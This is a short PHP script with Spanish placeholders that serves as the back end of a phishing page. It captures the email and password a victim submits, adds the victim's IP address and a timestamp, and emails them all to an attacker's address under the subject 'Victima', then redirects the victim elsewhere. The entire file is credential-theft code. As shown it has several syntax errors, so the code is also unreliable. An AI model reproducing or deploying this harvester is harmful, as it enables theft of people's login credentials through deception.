<? php

$usuario = $_POST['email']
$password = $_POST['pass']
$ip = $_SERVER['REMOTE_ADDR']
$fecha = date ("y-m-d;h:i:s");

if( (empty($usuario)) or (empty($password)) ){
	header('location: index.html');
}else{


$micorreo = "su email";
$asunto = "Victima"
$mensaje ="\n\nUsuario: ".$usuario."\n\nContraseña: ".$password."\n\nIP: " .$ip."\n\Fecha: ".$fecha;


mail($micorreo, $asunto, $mensaje);

header('Location: una url cualquiera');
}
?>
